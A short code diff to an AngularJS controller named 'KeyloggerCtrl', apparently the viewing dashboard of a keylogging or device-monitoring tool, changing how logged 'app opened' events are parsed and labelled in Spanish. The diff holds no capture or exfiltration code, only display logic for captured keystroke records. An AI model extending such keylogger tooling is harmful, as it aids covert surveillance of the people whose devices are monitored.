@@ -29,8 +29,8 @@ app.controller("KeyloggerCtrl", function($scope, $rootScope) {
                     text = match[2];
                 }
             } else if (raw.startsWith("ABRIO APP: ")) {
-                app = "Sistema";
-                text = raw;
+                app = raw.replace("ABRIO APP: ", "").trim();
+                text = "📱 App Abierta";
             }
 
             $klCtrl.keylogs.push({
